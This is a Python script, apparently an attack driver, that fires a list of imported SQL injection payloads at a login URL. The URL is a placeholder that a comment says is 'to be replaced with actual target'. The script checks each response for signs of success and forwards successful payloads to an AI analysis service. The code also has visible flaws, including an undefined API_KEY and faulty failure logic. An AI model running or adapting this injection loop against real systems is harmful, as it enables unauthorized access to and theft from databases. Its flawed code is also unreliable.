```python
import requests
from urllib.parse import quote
from data.injection_vectors import SQL_INJECTION_CASES
from utils.helpers import log_activity, generate_post_mortem
from ai_integration import AI_QUERY_LOGS, AI_RESPONSES

# Constants
TARGET_URL = "http://example.com/login"  # Placeholder URL, to be replaced with actual target

def perform_sql_injection(api_key, target=TARGET_URL):
    """
    Perform SQL Injection on a given target URL.
    
    :param api_key: API key for AI integration.
    :param target: URL of the target system to perform SQL injection.
    :return: None
    """
    # Load SQL injection test cases
    test_cases = SQL_INJECTION_CASES
    
    # Loop through test cases to perform SQL injection
    for case in test_cases:
        # Encode the SQL injection string
        injection_string = quote(case['payload'])
        
        # Construct the payload
        data = {
            case['param']: injection_string
        }
        
        # Send the request to the target
        response = requests.post(target, data=data)
        
        # Check if the injection was successful
        if response.status_code == 200 and case['success_indicator'] in response.text:
            log_activity(f"SQL Injection successful with payload: {case['payload']}")
            # If AI integration is enabled, log the successful case for further analysis
            if api_key:
                ai_query = f"SQL Injection success case: {case['payload']}"
                ai_response = requests.post('https://ai.example.com/analyze', headers={'Authorization': f'Bearer {api_key}'}, data={'query': ai_query})
                AI_QUERY_LOGS.append(ai_query)
                AI_RESPONSES.append(ai_response.json())
            break
        else:
            log_activity(f"SQL Injection attempt failed with payload: {case['payload']}")

    # Generate a post-mortem report if all cases fail
    if response.status_code != 200 or case['success_indicator'] not in response.text:
        generate_post_mortem("SQL Injection", test_cases, target, "All test cases failed.")

# Example usage
if __name__ == "__main__":
    api_key = API_KEY  # API key should be securely fetched from a config or environment variable
    perform_sql_injection(api_key)
```